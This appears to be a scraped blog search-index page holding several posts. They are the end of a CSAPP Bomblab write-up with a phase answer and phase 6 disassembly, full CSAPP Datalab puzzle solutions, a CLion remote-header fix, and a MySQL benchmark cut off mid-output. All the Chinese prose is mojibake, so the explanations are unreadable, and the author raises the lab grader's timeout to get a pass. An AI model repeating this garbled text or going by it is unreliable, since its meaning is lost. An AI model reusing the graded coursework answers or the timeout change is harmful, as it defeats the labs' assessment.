&lt;p&gt;è¿™é¢˜éœ€è¦æ ¹æ®æˆ‘ä»¬è¾“å…¥ä¸€ä¸ª6ä½å­—ç¬¦ä¸²ï¼Œæ ¹æ®æ¯ä¸ªå­—ç¬¦ä½å››ä½çš„å€¼ä» &lt;code&gt;0x4024b0&lt;/code&gt; å¤„çš„å­—ç¬¦ä¸²å–å‡ºå¯¹åº”ä½å­çš„å­—ç¬¦ï¼Œè€Œç›®æ ‡åº”è¯¥æ˜¯&lt;code&gt;0x40245e&lt;/code&gt; å¤„çš„å­—ç¬¦ &lt;code&gt;flyers&lt;/code&gt; ã€‚æ ¹æ®æ˜ å°„ï¼Œæˆ‘ä»¬çš„ä½å››ä½åˆ†åˆ«åº”è¯¥æ˜¯&lt;code&gt;9 f e 5 6 7&lt;/code&gt; ,æŸ¥ASCIIå¾—&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ionefg
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;phase_6&#34;&gt;phase_6&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;  4010f4:	41 56                	push   %r14
  4010f6:	41 55                	push   %r13
  4010f8:	41 54                	push   %r12
  4010fa:	55                   	push   %rbp
  4010fb:	53                   	push   %rbx
  4010fc:	48 83 ec 50          	sub    $0x50,%rsp
  401100:	49 89 e5             	mov    %rsp,%r13
  401103:	48 89 e6             	mov    %rsp,%rsi
  401106:	e8 51 03 00 00       	callq  40145c &amp;lt;read_six_numbers&amp;gt;
  40110b:	49 89 e6             	mov    %rsp,%r14
  40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d
  401114:	4c 89 ed             	mov    %r13,%rbp
  401117:	41 8b 45 00          	mov    0x0(%r13),%eax
  40111b:	83 e8 01             	sub    $0x1,%eax
  40111e:	83 f8 05             	cmp    $0x5,%eax
  401121:	76 05                	jbe    401128 &amp;lt;phase_6+0x34&amp;gt;
  401123:	e8 12 03 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  401128:	41 83 c4 01          	add    $0x1,%r12d
  40112c:	41 83 fc 06          	cmp    $0x6,%r12d
  401130:	74 21                	je     401153 &amp;lt;phase_6+0x5f&amp;gt;
  401132:	44 89 e3             	mov    %r12d,%ebx
  401135:	48 63 c3             	movslq %ebx,%rax
  401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax
  40113b:	39 45 00             	cmp    %eax,0x0(%rbp)
  40113e:	75 05                	jne    401145 &amp;lt;phase_6+0x51&amp;gt;
  401140:	e8 f5 02 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  401145:	83 c3 01             	add    $0x1,%ebx
  401148:	83 fb 05             	cmp    $0x5,%ebx
  40114b:	7e e8                	jle    401135 &amp;lt;phase_6+0x41&amp;gt;
  40114d:	49 83 c5 04          	add    $0x4,%r13
  401151:	eb c1                	jmp    401114 &amp;lt;phase_6+0x20&amp;gt;
  401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi
  401158:	4c 89 f0             	mov    %r14,%rax
  40115b:	b9 07 00 00 00       	mov    $0x7,%ecx
  401160:	89 ca                	mov    %ecx,%edx
  401162:	2b 10                	sub    (%rax),%edx
  401164:	89 10                	mov    %edx,(%rax)
  401166:	48 83 c0 04          	add    $0x4,%rax
  40116a:	48 39 f0             	cmp    %rsi,%rax
  40116d:	75 f1                	jne    401160 &amp;lt;phase_6+0x6c&amp;gt;
  40116f:	be 00 00 00 00       	mov    $0x0,%esi
  401174:	eb 21                	jmp    401197 &amp;lt;phase_6+0xa3&amp;gt;
  401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx
  40117a:	83 c0 01             	add    $0x1,%eax
  40117d:	39 c8                	cmp    %ecx,%eax
  40117f:	75 f5                	jne    401176 &amp;lt;phase_6+0x82&amp;gt;
  401181:	eb 05                	jmp    401188 &amp;lt;phase_6+0x94&amp;gt;
  401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx
  401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2)
  40118d:	48 83 c6 04          	add    $0x4,%rsi
  401191:	48 83 fe 18          	cmp    $0x18,%rsi
  401195:	74 14                	je     4011ab &amp;lt;phase_6+0xb7&amp;gt;
  401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx
  40119a:	83 f9 01             	cmp    $0x1,%ecx
  40119d:	7e e4                	jle    401183 &amp;lt;phase_6+0x8f&amp;gt;
  40119f:	b8 01 00 00 00       	mov    $0x1,%eax
  4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx
  4011a9:	eb cb                	jmp    401176 &amp;lt;phase_6+0x82&amp;gt;
  4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
  4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
  4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
  4011ba:	48 89 d9             	mov    %rbx,%rcx
  4011bd:	48 8b 10             	mov    (%rax),%rdx
  4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx)
  4011c4:	48 83 c0 08          	add    $0x8,%rax
  4011c8:	48 39 f0             	cmp    %rsi,%rax
  4011cb:	74 05                	je     4011d2 &amp;lt;phase_6+0xde&amp;gt;
  4011cd:	48 89 d1             	mov    %rdx,%rcx
  4011d0:	eb eb                	jmp    4011bd &amp;lt;phase_6+0xc9&amp;gt;
  4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)
  4011d9:	00 
  4011da:	bd 05 00 00 00       	mov    $0x5,%ebp
  4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax
  4011e3:	8b 00                	mov    (%rax),%eax
  4011e5:	39 03                	cmp    %eax,(%rbx)
  4011e7:	7d 05                	jge    4011ee &amp;lt;phase_6+0xfa&amp;gt;
  4011e9:	e8 4c 02 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
  4011f2:	83 ed 01             	sub    $0x1,%ebp
  4011f5:	75 e8                	jne    4011df &amp;lt;phase_6+0xeb&amp;gt;
  4011f7:	48 83 c4 50          	add    $0x50,%rsp
  4011fb:	5b                   	pop    %rbx
  4011fc:	5d                   	pop    %rbp
  4011fd:	41 5c                	pop    %r12
  4011ff:	41 5d                	pop    %r13
  401201:	41 5e                	pop    %r14
  401203:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¤´ç§ƒ...é‚æ”¾å¼ƒ&lt;br&gt;
&lt;a href=&#34;https://www.jianshu.com/p/c219e4df2521&#34;&gt;è¿™é‡Œæœ‰ä¸€ä»½è§£ç­”&lt;/a&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_6a0aaf69b5a27ac03ea4b91b3838098b.jpeg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">CSAPP: Bomblab</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/uscxh7_cc7kxq/"" data-c="
          &lt;p&gt;è¯•éªŒè·å–è¯·åˆ°å®˜ç½‘ &lt;a href=&#34;http://csapp.cs.cmu.edu/3e/labs.html&#34;&gt;CSAPP&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;1bitxor&#34;&gt;1.bitXor&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int bitXor(int x, int y) {
  return (~(x&amp;amp;y)) &amp;amp; (~((~x)&amp;amp;(~y)));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;å·¦è¾¹è¡¨è¾¾å¼ç­›é€‰å‡º &lt;code&gt;0,1 1,0 0,0&lt;/code&gt; ä¸‰ç§æƒ…å†µå¾—åˆ°1ï¼Œå³è¾¹è¡¨è¾¾å¼æ’é™¤ &lt;code&gt;0,0&lt;/code&gt; å¾—åˆ°1ï¼ŒäºŒè€…ä¸€èµ·å¾—åˆ° &lt;code&gt;0,1 1,0&lt;/code&gt; å³å¼‚æˆ–&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2tmin&#34;&gt;2.tmin&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int tmin(void) {
  return 1&amp;lt;&amp;lt;31;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;å¾ˆç®€å•&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3istmax&#34;&gt;3.isTmax&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int isTmax(int x) {
  return !(((~(x+1))^x) | (!(~x)));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;æˆ–è¿ç®— &lt;code&gt;|&lt;/code&gt; å·¦è¾¹ç­›é€‰å‡º &lt;code&gt;0x7fffffff&lt;/code&gt; Â å’Œ &lt;code&gt;0xffffffff&lt;/code&gt; Â å¾—åˆ°å…¨0 , å³è¾¹å¯¹äº &lt;code&gt;0x7fffffff&lt;/code&gt; å¾—åˆ°å…¨0ï¼Œ å¯¹äº &lt;code&gt;0xffffffff&lt;/code&gt; Â å¾—åˆ°1 ï¼Œç»è¿‡æˆ–è¿ç®—ä¹‹ååªæœ‰ç›®æ ‡Tmax &lt;code&gt;0x7fffffff&lt;/code&gt; ä¼šå¾—åˆ°0ï¼Œå–éä¹‹åè¿”å›&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4alloddbits&#34;&gt;4.AllOddBits&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int allOddBits(int x) {
  int allodd0 = (0x55&amp;lt;&amp;lt;24) + (0x55&amp;lt;&amp;lt;16) + (0x55&amp;lt;&amp;lt;8) +0x55;
  return !(~(allodd0 | x));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;æ¯”è¾ƒç®€å•ï¼Œç”¨å¥‡æ•°ä½å…¨0ï¼Œå¶æ•°ä½å…¨1å»è¿›è¡Œæˆ–è¿ç®—å³å¯&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5negate&#34;&gt;5.negate&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int negate(int x) {
  return (~x) + 1;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;x + ~x + 1 = 0&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;6isascciidigit&#34;&gt;6.isAscciiDigit&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int isAsciiDigit(int x) {
  int a = (x&amp;gt;&amp;gt;3)^0x6;
  int b = x^0x38;
  int c = x^0x39;
  return !a | !b | !c;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;a ç­›é€‰å‡º &lt;code&gt;0x30&lt;/code&gt; Â è‡³ &lt;code&gt;0x37&lt;/code&gt; Â ï¼Œè‹¥ç¬¦åˆ a çš„å€¼ä¸º 0 ï¼Œb ç­›é€‰ &lt;code&gt;0x38&lt;/code&gt; ï¼Œ c ç­›é€‰ &lt;code&gt;0x39&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;7conditional&#34;&gt;7.conditional&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int conditional(int x, int y, int z) {
  int negative1 = ~1 + 1;	//-1
  int control = !x + negative1;		//x=0 ,c=0 ;x!=0 ,c=0xffffffff 
  return (y&amp;amp;control) + (z&amp;amp;(~control));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;æƒ³äº†å¥½ä¹…ï¼Œæ€è·¯åœ¨ä»£ç é‡Œï¼Œå…³é”®ç‚¹æ˜¯ &lt;code&gt;0-1=0xffffffff&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;8islessorequal&#34;&gt;8.isLessOrEqual&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int isLessOrEqual(int x, int y) {
  int negativex = ~x+1;
  int a = !((!(x&amp;gt;&amp;gt;31))|(y&amp;gt;&amp;gt;31));	//x&amp;lt;0 ä¸” y&amp;gt;=0
  int b = (( !((x&amp;gt;&amp;gt;31)^(y&amp;gt;&amp;gt;31)) ) &amp;amp; (!((y+negativex)&amp;gt;&amp;gt;31) | !(x^(1&amp;lt;&amp;lt;31)))); 
  //			x,yå¼‚å·			ä¸” ( 	y-x&amp;gt;=0			æˆ–   x=0xffffffff )
  return a | b;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;è¿™é“é¢˜å°±æ˜¯ç”¨æ¥è¯´æ˜ &lt;code&gt;x&amp;lt;=y&lt;/code&gt; Â ä¸ä»£è¡¨ &lt;code&gt;x-y&amp;lt;=0&lt;/code&gt; çš„ï¼ŒTmin å’Œ Tmax ä¸¤ä¸ªè¾¹ç•Œå¾ˆè¦å‘½ ï¼Œè¿˜æœ‰è¿ç®—å¯èƒ½æº¢å‡ºã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;9logicalneg&#34;&gt;9.logicalNeg&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int logicalNeg(int x) {
  return ((x|(~x+1))&amp;gt;&amp;gt;31)+1;;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;é™¤äº† 0 å’Œ Tmin ä»¥å¤–ï¼Œæ‰€æœ‰æ•°å’Œå…¶è¡¥ç éƒ½æ˜¯å¼‚å·çš„ï¼Œè€Œ Tmin çš„ç¬¦å·ä½ä¸º1ï¼Œæ‰€ä»¥åœ¨å’Œè‡ªå·±çš„è¡¥ç é€»è¾‘æˆ–è¿ç®—ä»¥åï¼Œåªæœ‰ 0 çš„ç¬¦å·ä½ä¸º 0 ï¼Œä»¥æ­¤æ±‚è§£&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;10howmanybits&#34;&gt;10.howManyBits&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int howManyBits(int x) {
 int shift1,shift2,shift4,shift8,shift16;
 int sum;
 int t=((!x)&amp;lt;&amp;lt;31)&amp;gt;&amp;gt;31;//xä¸º0æ—¶ï¼Œtï¼ˆäºŒè¿›åˆ¶ï¼‰å…¨ä¸º1ï¼Œxä¸ä¸º0æ—¶ï¼Œå…¨ä¸º1
 int t2=((!~x)&amp;lt;&amp;lt;31)&amp;gt;&amp;gt;31;//å½“xä¸º-1æ—¶ï¼Œt2å…¨ä¸º1ï¼Œå¦åˆ™ï¼Œå…¨ä¸º0
 int op=x^((x&amp;gt;&amp;gt;31));//æ­£æ•°ä¸å˜ï¼Œè´Ÿæ•°å–å
 shift16=(!!(op&amp;gt;&amp;gt;16))&amp;lt;&amp;lt;4;//å¦‚æœé«˜åå…­ä½å…¨ä¸º0ï¼Œåˆ™0å·¦ç§»4ä½ï¼Œä¸å…¨ä¸º0ï¼Œåˆ™1å·¦ç§»4ï¼ˆè¡¨ç¤ºopè¦å³ç§»2^4ä½ï¼‰ä½
 op=op&amp;gt;&amp;gt;shift16;
 shift8=(!!(op&amp;gt;&amp;gt;8))&amp;lt;&amp;lt;3;
 op=op&amp;gt;&amp;gt;shift8;
 shift4=(!!(op&amp;gt;&amp;gt;4))&amp;lt;&amp;lt;2;
 op=op&amp;gt;&amp;gt;shift4;
 shift2=(!!(op&amp;gt;&amp;gt;2))&amp;lt;&amp;lt;1;
 op=op&amp;gt;&amp;gt;shift2;
 shift1=(!!(op&amp;gt;&amp;gt;1));
 op=op&amp;gt;&amp;gt;shift1;
 sum=2+shift16+shift8+shift4+shift2+shift1;
 return(t2&amp;amp;1)|((~t2)&amp;amp;((t&amp;amp;1)|((~t)&amp;amp;sum)));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ç•¥æœ‰ç‚¹å¤æ‚ï¼Œæœ€åå‚è€ƒäº†&lt;a href=&#34;https://blog.csdn.net/tzh476/article/details/51284938&#34;&gt;è¿™ç¯‡ &lt;/a&gt;ï¼Œè¿™ä¸ªäºŒåˆ†æ³•æŒºå·§å¦™çš„&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;11floatscale2&#34;&gt;11.floatScale2&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;unsigned floatScale2(unsigned uf) {
  int e = (uf&amp;gt;&amp;gt;23) &amp;amp; 0xff;
  int rte = e+1;
  if(!e)//e=0
	return (uf&amp;amp;0xf0000000) + ((uf&amp;amp;0x7fffff)&amp;lt;&amp;lt;1);
  else if(!(e^0xff))
	return uf;
  else if(rte&amp;amp;(1&amp;lt;&amp;lt;8))
	return ((uf&amp;gt;&amp;gt;31)&amp;lt;&amp;lt;31) + (0xff&amp;lt;&amp;lt;23);
  else
    return (uf&amp;amp;(0x807fffff)) + (rte&amp;lt;&amp;lt;23);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;è§„æ ¼åŒ–çš„æµ®ç‚¹æ•°ä¹˜2å°±æ˜¯æŠŠé˜¶ç åŠ ä¸€ï¼Œéè§„æ ¼åŒ–å’Œç‰¹æ®Šå€¼å•ç‹¬å¤„ç†&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;12floatfloat2int&#34;&gt;12.floatFloat2Int&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;int floatFloat2Int(unsigned uf)
{
  int e = (uf &amp;gt;&amp;gt; 23) &amp;amp; 0xff;	//é˜¶ç 
  int f = uf &amp;amp; 0x7fffff;		//å°¾ç 
  int tag = uf &amp;amp; 0x80000000;	//ç¬¦å·ä½
  if (e &amp;lt;= 126)		//å°äº0
    return 0;
  else if (e &amp;gt; 157)	//ä¸Šæº¢
    return 0x80000000;
  else		//èŒƒå›´å†…
  {
    int s = e - 127;
    f = f + 0x800000;
    if (s &amp;gt;= 23)
    {
      int r = f &amp;lt;&amp;lt; (s - 23);
      if (tag)
        return -r;
      else
        return r;
    }
    else
    {
      int r = (f &amp;gt;&amp;gt; (23 - s));
      if (tag)
        return -r;
      else
        return r;
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;é¢˜ç›®ä¸éš¾ï¼Œå°±æ˜¯é€»è¾‘æœ‰ç‚¹å¤æ‚ï¼Œè¿˜è¦æ³¨æ„c/c++ä¸­çš„èˆå…¥æ˜¯æ–­å°¾æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;13floatpower2&#34;&gt;13.floatPower2&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;unsigned floatPower2(int x) {
    unsigned INF = 0xff &amp;lt;&amp;lt; 23; // é˜¶ç å…¨1
    int e = 127 + x;    // å¾—åˆ°é˜¶ç 
    if (x &amp;lt; 0) // é˜¶æ•°å°äº0ç›´æ¥è¿”å›0
        return 0;
    if (e &amp;gt;= 255) // é˜¶ç &amp;gt;=255ç›´æ¥è¿”å›INF
        return INF;
    return e &amp;lt;&amp;lt; 23;
    // ç›´æ¥å°†é˜¶ç å·¦ç§»23ä½ï¼Œå°¾æ•°å…¨0ï¼Œè§„æ ¼åŒ–æ—¶å°¾æ•°éšè—æœ‰1ä¸ª1ä½œä¸ºåº•æ•°
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ä¸éš¾&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æœ€åä¸€é¢˜æœ‰ä¸ªå°æ’æ›²ï¼Œå°±æ˜¯æœ€åä¸€ä¸ªé¢˜ç›®æµ‹è¯•æ—¶ä¼šæç¤ºæ­»å¾ªç¯&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_a01801de3f48b76e31504865bbd88d91.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä½†æ˜¯é€»è¾‘æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œæœ€åçœ‹äº†ä¸‹æµ‹è¯•æ–‡ä»¶çš„ä»£ç ï¼Œåœ¨ &lt;code&gt;btest.c&lt;/code&gt; æ–‡ä»¶çš„å¼€å¤´é™åˆ¶äº†è¶…æ—¶æ—¶é—´ä¸º10sï¼Œ&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_0cee5ea6673b33f2f68d77f11ed05060.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å°†TIMEOUT_LIMITä¿®æ”¹ä¸º100ï¼Œæµ‹è¯•é€šè¿‡&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_a8e69e3d6dc3f9adafaf54bca8eb3990.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;æœ€åæ˜¯å®Œæ•´æ–‡ä»¶&#34;&gt;æœ€åæ˜¯å®Œæ•´æ–‡ä»¶&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://static.yulan.net.cn/image/csapp_datalab.c&#34;&gt;å®Œæ•´æ–‡ä»¶&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;å°ç»“&#34;&gt;å°ç»“&lt;/h2&gt;
&lt;p&gt;æ…•åè€Œæ¥çœ‹äº†CSAPPï¼Œä¸å¾—ä¸è¯´çœ‹äº†è¿™æœ¬ä¹¦å†™çš„çœŸçš„å¾ˆå¥½ï¼Œçœ‹å®Œç¬¬äºŒç« æˆ‘å¯¹æµ®ç‚¹æ•°çš„è®¤çŸ¥ç¡®å®æ›´æ¸…æ™°äº†ï¼Œåç»­æˆ‘åšäº†å…¶ä»–labä¹‹åï¼Œä¹Ÿä¼šé€ä¸€å‘ä¸Šæ¥ï¼Œæ¬¢è¿å¤§å®¶å…³æ³¨ã€‚&lt;/p&gt;
">CSAPP: datalab</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/qcz5ki_ozd4q9/"" data-c="
          &lt;p&gt;ä¸€ç›´ç”¨clionåšè¿œç¨‹å¼€å‘ï¼Œä¸ç®¡æ˜¯é¢œå€¼è¿˜æ˜¯è‡ªåŠ¨è¡¥å…¨éƒ½æŒºèˆ’æœï¼Œä½†æ˜¯ä»Šå¤©é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯clionæ‰¾ä¸åˆ°Linuxä¸­çš„åº“æ–‡ä»¶ï¼Œæ‰€ä»¥å°±æ²¡æœ‰ä»£ç è¡¥å…¨ï¼Œä½†æ˜¯ç¼–è¯‘æ˜¯æ­£å¸¸çš„ã€‚æ›´å…·ä½“ç‚¹ï¼Œæ‰¾å¾—åˆ° &lt;code&gt;unistd.h&lt;/code&gt;ä½†æ˜¯æ‰¾ä¸åˆ°&lt;code&gt;sys/types.h&lt;/code&gt;ã€‚&lt;br&gt;
â€‹&lt;/p&gt;
&lt;h2 id=&#34;è§£å†³åŠæ³•&#34;&gt;è§£å†³åŠæ³•&lt;/h2&gt;
&lt;p&gt;ç‚¹å‡»&lt;strong&gt;Help| Find Action&lt;/strong&gt;, è¾“å…¥&lt;strong&gt;Registry&lt;/strong&gt;ï¼Œä¹‹åå‹¾é€‰&lt;strong&gt;clion.remote.tar.dereference&lt;/strong&gt;&lt;br&gt;
â€‹&lt;/p&gt;
&lt;h2 id=&#34;åŸå› &#34;&gt;åŸå› &lt;/h2&gt;
&lt;p&gt;clionçš„remoteè‡ªåŠ¨è¡¥å…¨æ˜¯å°†è¿œç¨‹Liunxä¸‹çš„ç›¸å…³å¤´æ–‡ä»¶ç¼“å­˜åˆ°æœ¬åœ°ï¼Œè€Œè¿™ä¸ªç¼“å­˜æ˜¯å…ˆä½¿ç”¨taræ‰“åŒ…ï¼Œç„¶åä¸‹è½½åˆ°æœ¬åœ°ï¼Œç„¶è€ŒLinuxä¸Šçš„ä¸€äº›å¤´æ–‡ä»¶å®é™…ä¸Šæ˜¯è½¯é“¾æ¥ï¼Œtaræ‰“åŒ…çš„æ—¶å€™ä¼šæŒ‰è½¯é“¾æ¥æ‰“åŒ…ï¼Œä¸‹è½½åˆ°æœ¬åœ°è§£å‹åè‡ªç„¶æ— æ³•è§£æã€‚å‹¾é€‰clion.remote.tar.dereferenceæ˜¯è®©tarå‘½ä»¤ Enable dereference (-h) and &#39;--hard-dereference&#39; tar arguments&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_300aaae632fed92961e606c0e3a83ccd.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¿™æ ·å°±å¯ä»¥è§£æè½¯é“¾æ¥åˆ°å¯¹åº”æ–‡ä»¶ï¼Œä¸‹è½½åˆ°æœ¬åœ°çš„å°±æ˜¯æ–‡ä»¶è€Œä¸æ˜¯è½¯é“¾æ¥ã€‚&lt;br&gt;
â€‹&lt;/p&gt;
&lt;p&gt;ä¿®æ”¹ä¹‹åå†Tool -&amp;gt; Resync with remote hostsï¼Œå¦‚æœè¿˜æ˜¯ä¸è¡Œå°±æŠŠæœ¬åœ°ç¼“å­˜åˆ æ‰é‡æ–°Resyncã€‚&lt;br&gt;
æœ¬åœ°ç¼“å­˜ä¸€èˆ¬åœ¨&lt;code&gt;C:\Users\ç”¨æˆ·å\AppData\Local\JetBrains\CLion2021.1\.remote&lt;/code&gt;ä¸‹ï¼Œåœ¨Problemsä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°ç¼“å­˜è·¯å¾„ï¼ˆä¸€èˆ¬æ˜¯` Cannot open file ***è·¯å¾„ï¼ŒPermission Deniedï¼‰&lt;/p&gt;
">clion remoteæ¨¡å¼æ— ä»£ç è¡¥å…¨ï¼ˆæ‰¾ä¸åˆ°Linuxå¤´æ–‡ä»¶ï¼‰</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_zn7g7o/"" data-c="
          &lt;h1 id=&#34;ç¯å¢ƒä¿¡æ¯&#34;&gt;ç¯å¢ƒä¿¡æ¯&lt;/h1&gt;
&lt;p&gt;è…¾è®¯äº‘å­¦ç”Ÿæœºï¼Œ1æ ¸Intel(R) Xeon(R) CPU E5-26xx v4 CPUï¼Œ2Gå†…å­˜&lt;br&gt;
MySQLç‰ˆæœ¬ä¸º mysql  Ver 8.0.23 for Linux on x86_64 (MySQL Community Server - GPL)&lt;br&gt;
Redisç‰ˆæœ¬ä¸º Redis server v=4.0.9 sha=00000000:0 malloc=jemalloc-3.6.0 bits=64 build=9435c3c2879311f3&lt;/p&gt;
&lt;h1 id=&#34;mysql&#34;&gt;MySQL&lt;/h1&gt;
&lt;p&gt;ä½¿ç”¨è‡ªå¸¦çš„å·¥å…·mysqlslap&lt;br&gt;
æµ‹è¯•å‘½ä»¤ ï¼š&lt;br&gt;
mysqlslap -a --concurrency=10,20,50,100 --number-of-queries=10000 --iterations=2 -uroot -p*** --auto-generate-sql-load-type=key --auto-generate-sql-unique-write-number=100000 --auto-generate-sql-write-number=100000 --auto-generate-sql-guid-primary&lt;/p&gt;
&lt;p&gt;å‚æ•°è§£é‡Šï¼š&lt;br&gt;
--concurrency=10,20,50,100 --number-of-queries=10000ï¼Œåˆ†åˆ«æµ‹è¯•10ã€20ã€50ã€100ä¸ªå¹¶å‘å®¢æˆ·ç«¯ï¼Œæ¯æ¬¡æµ‹è¯•åˆè®¡è¿›è¡Œ10000æ¬¡æŸ¥è¯¢ï¼ˆæ¯ä¸ªå®¢æˆ·ç«¯æ‰§è¡Œ100000/--concurrencyæ¬¡ï¼‰&lt;br&gt;
--auto-generate-sql-unique-write-number=100000 --auto-generate-sql-write-number=100000ç»„åˆä½¿ç”¨å‘æ•°æ®åº“ä¸­æ’å…¥100000æ¡ä¸åŒæ•°æ®&lt;br&gt;
--auto-generate-sql-guid-primaryï¼Œç”Ÿæˆuuidä¸»é”®&lt;br&gt;
--auto-generate-sql-unique-query-number=10000 --auto-generate-sql-load-type=keyï¼Œæ¯ä¸ªå®¢æˆ·ç«¯æ‰§è¡Œ10000æ¡æŸ¥è¯¢ï¼ŒæŸ¥è¯¢æ¨¡å¼ä¸ºä¸»é”®æŸ¥è¯¢&lt;br&gt;
--iterations=2ï¼Œæ‰§è¡Œ2ä¸ªè½®æ¬¡å–å¹³å‡&lt;br&gt;
æ•°æ®é‡‡ç”¨é»˜è®¤æ¨¡å¼ï¼Œæ¯è¡Œä¸€ä¸ªä¸»é”®ã€ä¸€ä¸ªintã€ä¸€ä¸ªvarchar(128)&lt;/p&gt;
&lt;p&gt;ç»“æœï¼š&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_23e142d7eaf6b8142efe50fafe3b6f21.png&#34; alt=&#34;å›¾ç‰‡.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;Benchmark
        Average number of seconds to run all queries: 1.083 seconds
        Minimum number of seconds to run all queries: 1.046 seconds
        Maximum number of seconds to run all queries: 1.121 seconds
        Number of clients running queries: 10
        Average number of queries per client: 1000

Benchmark
        Average number of seconds to run all queries: 1.124 seconds
        Minimum number of seconds to run all queries: 1.119 seconds
        Maximum number of seconds to run all queries: 1.129 seconds
        Number of clients running queries: 20
